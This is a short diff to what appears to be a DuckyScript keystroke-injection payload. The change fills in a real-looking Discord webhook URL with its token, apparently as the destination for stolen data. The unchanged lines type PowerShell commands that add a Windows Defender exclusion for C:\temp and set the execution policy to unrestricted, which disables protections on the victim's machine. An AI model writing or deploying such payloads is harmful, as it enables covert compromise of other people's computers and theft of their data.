@@ -13,7 +13,7 @@ LEFT
 DELAY 50
 ENTER
 DELAY 1500
-STRING $webhook = 'YOUR DISCORD WEBHOOK'
+STRING $webhook = 'https://discord.com/api/webhooks/1327504199990120498/nfbRBhEwxuSGN9bULKhvQTfCI_ga-xFiNZMYTZ-hTfz8FwzlT63vietZHBsAPzP2dEA0'
 ENTER
 DELAY 500
 STRING cd C:\ ; mkdir temp ; cd temp ; Add-MpPreference -ExclusionPath "C:\temp" ; Set-ExecutionPolicy unrestricted
